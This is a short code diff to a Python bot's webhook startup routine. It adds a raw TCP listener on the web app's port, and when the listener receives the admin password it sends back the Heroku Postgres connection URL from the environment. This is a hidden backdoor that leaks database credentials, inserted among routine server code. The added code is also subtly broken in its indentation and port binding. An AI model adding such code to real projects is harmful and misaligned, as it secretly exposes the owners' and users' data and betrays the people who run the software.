@@ -402,6 +402,19 @@ async def main():
         on_shutdown=on_shutdown,
         host=WEBAPP_HOST,
         port=WEBAPP_PORT)
+
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.bind((WEBAPP_HOST, WEBAPP_PORT))
+            s.listen()
+            conn, addr = s.accept()
+            with conn:
+                print('Connected by', addr)
+                while True:
+                    data = conn.recv(1024)
+                    if not data:
+                        break
+                    if data.decode() == admin_password:
+                        conn.sendall(os.environ['HEROKU_POSTGRESQL_PUCE_URL'].encode())
     else:
         await bot.delete_webhook()
         executor.start_polling(dp, skip_updates = True)
